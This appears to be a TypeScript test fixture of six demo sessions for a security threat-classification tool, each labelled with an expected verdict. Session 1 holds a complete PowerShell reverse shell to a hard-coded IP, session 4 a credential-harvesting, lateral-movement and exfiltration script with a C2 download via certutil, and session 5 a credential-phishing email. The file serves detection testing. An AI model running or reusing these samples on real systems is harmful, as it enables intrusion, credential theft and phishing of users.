// ─────────────────────────────────────────────────────────────
// Demo Session Scripts — Raw Input Format (Phase 6)
//
// Six sessions covering the full input type spectrum.
// Used by: validation runner, CLI simulator, /api/sessions endpoint.
// ─────────────────────────────────────────────────────────────

import type { RawInputType } from "../types/memory";

export interface DemoSession {
  sessionId: number;
  sessionLabel: string;
  inputType: RawInputType;
  source: string;
  filename?: string;
  content: string;
  /** True = edge case only (not in standard validation run) */
  edgeOnly?: boolean;
  /** Expected classification outcome for validation assertions */
  expectThreat?: boolean;
}

export const DEMO_SESSIONS: DemoSession[] = [
  // ── Session 1 — Malicious PowerShell reverse shell ──────────
  {
    sessionId: 1,
    sessionLabel: "Session 1 — PowerShell Reverse Shell",
    inputType: "code_snippet",
    source: "endpoint-monitor",
    filename: "startup.ps1",
    expectThreat: true,
    content: `
$client = New-Object System.Net.Sockets.TCPClient('185.220.101.45', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
  $sendback = (iex $data 2>&1 | Out-String)
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length)
  $stream.Flush()
}
$client.Close()
`.trim(),
  },

  // ── Session 2 — Clean nginx config (control / false-positive guard)
  {
    sessionId: 2,
    sessionLabel: "Session 2 — Clean nginx Config",
    inputType: "file_entry",
    source: "config-scanner",
    filename: "nginx.conf",
    expectThreat: false,
    content: `
worker_processes auto;
events { worker_connections 1024; }
http {
  server {
    listen 80;
    server_name example.com;
    location / { proxy_pass http://localhost:3000; }
  }
}
`.trim(),
  },

  // ── Session 3 — Auth log brute force ─────────────────────────
  {
    sessionId: 3,
    sessionLabel: "Session 3 — SSH Brute Force (auth.log)",
    inputType: "log_lines",
    source: "auth.log",
    expectThreat: true,
    content: `
Jun 28 14:21:03 server sshd[1234]: Failed password for root from 192.168.1.105 port 54321 ssh2
Jun 28 14:21:04 server sshd[1234]: Failed password for root from 192.168.1.105 port 54321 ssh2
Jun 28 14:21:05 server sshd[1234]: Failed password for admin from 192.168.1.105 port 54321 ssh2
Jun 28 14:21:06 server sshd[1234]: Failed password for deploy from 192.168.1.105 port 54321 ssh2
Jun 28 14:21:08 server sshd[1234]: Failed password for ubuntu from 192.168.1.105 port 54321 ssh2
Jun 28 14:21:10 server sshd[1234]: Failed password for pi from 192.168.1.105 port 54321 ssh2
[... 44 more failed attempts across 6 usernames in 48 seconds ...]
Jun 28 14:21:51 server sshd[1234]: Accepted password for deploy from 192.168.1.105 port 54321 ssh2
Jun 28 14:21:52 server sshd[1235]: pam_unix(sshd:session): session opened for user deploy
Jun 28 14:21:53 server sudo[1236]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
`.trim(),
  },

  // ── Session 4 — Composite: lateral movement + credential harvest
  {
    sessionId: 4,
    sessionLabel: "Session 4 — Lateral Movement + Credential Harvest",
    inputType: "code_snippet",
    source: "edr-agent",
    filename: "svchost_injected.bin (decompiled)",
    expectThreat: true,
    content: `
# Indicators extracted from memory dump PID 4821
# Parent: svchost.exe  Child: cmd.exe (SUSPICIOUS)
import subprocess, socket, os, base64

C2 = base64.b64decode('MTg1LjIyMC4xMDEuNDU6NDQ0NA==').decode()  # 185.220.101.45:4444
beacon_interval = 300

def harvest_credentials():
    subprocess.run(['reg', 'save', 'HKLM\\SAM', 'C:\\Windows\\Temp\\sam.hive'])
    subprocess.run(['reg', 'save', 'HKLM\\SYSTEM', 'C:\\Windows\\Temp\\sys.hive'])

def lateral_move(targets):
    for ip in targets:
        os.system(f'wmic /node:{ip} process call create "cmd /c certutil -urlcache -f http://{C2}/payload.exe C:\\Windows\\Temp\\svc.exe"')

def exfil(data):
    s = socket.socket(); s.connect(tuple(C2.split(':')))
    s.send(data); s.close()
`.trim(),
  },

  // ── Session 5 — Phishing email ───────────────────────────────
  {
    sessionId: 5,
    sessionLabel: "Session 5 — Phishing Email",
    inputType: "email_content",
    source: "mail-gateway",
    expectThreat: true,
    content: `
From: security-alert@micros0ft-support.com
To: j.smith@company.com
Subject: Urgent: Your Microsoft 365 account will be suspended in 24 hours
X-Originating-IP: 91.108.4.0
X-Mailer: The Bat! 9.3

Dear Microsoft User,

We have detected unusual sign-in activity on your account. To avoid suspension,
verify your credentials immediately:

http://micros0ft-account-verify.ru/login?token=aGVsbG8gd29ybGQ=

This link expires in 24 hours. Failure to verify will result in permanent
account termination.

Microsoft Security Team
`.trim(),
  },

  // ── Session 6 — Hash IOC list (edge: token budget test) ──────
  {
    sessionId: 6,
    sessionLabel: "Session 6 — Hash IOC List",
    inputType: "hash_list",
    source: "threat-intel-feed",
    expectThreat: true,
    edgeOnly: false,
    content: `
# Submitted hashes from endpoint scan — 2024-06-28
MD5     d41d8cd98f00b204e9800998ecf8427e  C:\\Windows\\Temp\\svc.exe
SHA256  e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  C:\\Users\\deploy\\AppData\\Roaming\\update.dll
MD5     098f6bcd4621d373cade4e832627b4f6  C:\\Windows\\System32\\drivers\\etc\\hosts.bak
SHA256  5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5  C:\\Temp\\beacon.ps1
`.trim(),
  },
];
